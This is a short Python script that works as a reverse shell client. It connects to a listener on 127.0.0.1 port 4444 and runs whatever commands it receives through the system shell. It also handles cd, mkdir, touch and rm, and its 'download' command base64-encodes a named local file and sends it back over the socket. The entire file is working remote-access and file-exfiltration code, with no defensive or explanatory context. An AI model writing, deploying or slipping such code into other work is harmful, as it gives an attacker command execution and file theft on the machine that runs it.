import socket
HOST='127.0.0.1'
PORT = 4444
import subprocess
import os 
import base64


with socket.socket(socket.AF_INET , socket.SOCK_STREAM) as s:
    s.connect((HOST , PORT))
    while True:
        data = s.recv(1024).decode()
        commands = data.split()
        print(commands)
        if commands[0] == 'cd':
            try:
                os.chdir(commands[1])
                data = f'Dir changed to {commands[1]}'.encode()
            except:
                data ="error".encode() 
        elif commands[0] == 'mkdir':
            subprocess.check_output(data , shell=True)
            data = f"created dir sucessfully {commands[1]}".encode()

        elif commands[0] == 'touch':
            subprocess.check_output(data , shell=True)
            data = f"created file sucessfully {commands[1]}".encode()

        elif commands[0] == 'rm':
            print('here ')
            subprocess.check_output(data , shell=True)
            data = f"remove file succesfully  {commands[1]}".encode()
        elif commands[0] == 'download':
            with open( commands[1] , 'rb' ) as file:
                data  =  base64.b64encode(file.read())
        
        elif commands[0] == 'exit':
            s.close()
            exit()

        else:
            data = subprocess.check_output(data , shell=True)
            print(data)
 
        s.send(data)